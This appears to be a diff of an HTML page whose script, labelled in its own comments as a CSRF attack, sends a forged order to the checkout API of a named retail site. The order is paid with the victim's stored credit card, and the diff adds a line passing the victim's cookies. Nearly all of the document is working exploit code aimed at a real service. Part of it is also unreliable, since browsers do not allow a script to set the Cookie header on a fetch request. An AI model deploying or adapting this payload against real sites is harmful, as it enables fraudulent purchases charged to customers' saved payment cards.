@@ -8,63 +8,72 @@
 <body>
 
 <script>
+  // Crafting the POST request to forge a CSRF attack
+  const csrfPayload = {
+    "fullName": "Jackson",
+    "payerName": "", // This can be left blank or populated as needed
+    "contactNumber": "0688668843",
+    "deliveryAddress": {
+      "addressType": "postal",
+      "addressee": "Peter",
+      "organisationName": "n/a",
+      "buildingNameNumber": "test2",
+      "line1": "test2",
+      "line2": "test2",
+      "line3": "germany2",
+      "line4": "germany2",
+      "postcode": "066802",
+      "countryCode": "KE",
+      "defaultDeliveryAddress": false,
+      "defaultBillingAddress": false
+    },
+    "payment": {
+      "method": "stored-credit-card",
+      "idHash": "1001", // Change this to a valid ID hash if required
+      "consentToReuse": null
+    },
+    "deliverySelection": {
+      "groupSelections": [{
+        "groupId": 0,
+        "deliveryOptionType": 6,
+        "subDeliveryOptionIndex": null,
+        "used": true
+      }],
+      "deliveryOptionsRequest": {
+        "addressId": "1002" // Change this if needed
+      }
+    },
+    "reCaptchaToken": "", // Populate this if needed
+    "giftCards": [],
+    "deviceInformation": {
+      "deviceId": "7dccf24d14c2a58e1c7d33f040f1911b",
+      "screenResolution": {
+        "width": 1376,
+        "height": 774,
+        "ratio": 1.3953488372093024
+      },
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
+      "timezone": "Africa/Nairobi",
+      "language": "en-US",
+      "acceptHeader": "application/json",
+      "colorDepth": 24,
+      "timeZoneOffset": -180,
+      "javaEnabled": false
+    }
+  };
+
+  // Sending the fetch request
   fetch("https://checkout.powerman.co.uk/checkout-api/v2/order/place-order", {
     method: "POST",
     headers: {
-      "Content-Type": "application/json"
+      "Content-Type": "application/json",
+      "Cookie": document.cookie // Include cookies if available in the victim's context
     },
-    body: JSON.stringify({
-      "fullName": "Jackson",
-      "payerName": "",
-      "contactNumber": "0688668843",
-      "deliveryAddress": {
-        "addressType":"postal","addressee":"Peter",
-        "organisationName":"n/a",
-        "buildingNameNumber":"test2",
-        "line1":"test2",
-        "line2":"test2",
-        "line3":"germany2",
-        "line4":"germany2",
-        "postcode":"066802",
-        "countryCode":"KE",
-        "defaultDeliveryAddress":false,
-        "defaultBillingAddress":false
-      },
-      "payment": {
-        "method": "stored-credit-card",
-        "idHash": "1001",
-        "consentToReuse": null
-      },
-      "deliverySelection": {
-        "groupSelections": [{
-          "groupId": 0,
-          "deliveryOptionType": 6,
-          "subDeliveryOptionIndex": null,
-          "used": true
-        }],
-        "deliveryOptionsRequest": {
-          "addressId": "1002"
-        }
-      },
-      "reCaptchaToken": "",
-      "giftCards": [],
-      "deviceInformation": {
-        "deviceId": "7dccf24d14c2a58e1c7d33f040f1911b",
-        "screenResolution": {
-          "width": 1376,
-          "height": 774,
-          "ratio": 1.3953488372093024
-        },
-        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0",
-        "timezone": "Africa/Nairobi",
-        "language": "en-US",
-        "acceptHeader": "application/json",
-        "colorDepth": 24,
-        "timeZoneOffset": -180,
-        "javaEnabled": false
-      }
-    })
-  });
+    body: JSON.stringify(csrfPayload)
+  })
+  .then(response => response.json())
+  .then(data => console.log('Success:', data))
+  .catch((error) => console.error('Error:', error));
 </script>
 
 </body>
